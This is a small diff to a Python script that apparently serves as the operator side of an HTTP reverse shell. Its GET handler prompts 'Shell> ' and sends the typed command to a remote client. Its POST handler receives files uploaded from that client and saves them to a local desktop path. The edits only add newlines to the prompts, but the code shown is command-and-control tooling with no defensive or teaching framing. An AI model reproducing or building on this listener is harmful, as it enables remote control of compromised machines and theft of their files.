@@ -11,7 +11,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
 
     def do_GET(self):
 
-        command = input("Shell> ")
+        command = input("\nShell> ")
 
         self.send_response(200)
         self.send_header("Content-type", "text/html")
@@ -33,12 +33,12 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     print("[-] Unexpected POST request")
 
                 fs_up = fs['file']
-                filename = input("Please input File Name :")
+                filename = input("\nPlease input File Name :")
                 with open(r'C:\Users\Shawqi\Desktop\ ' + filename, 'wb') as o:
                     o.write(fs_up.file.read())
                     self.send_response(200)
                     self.end_headers()
-                    print("[+] Transfer Completed")
+                    print("\n[+] Transfer Completed")
 
             except Exception as e:
                 print('Error:', end=' ')
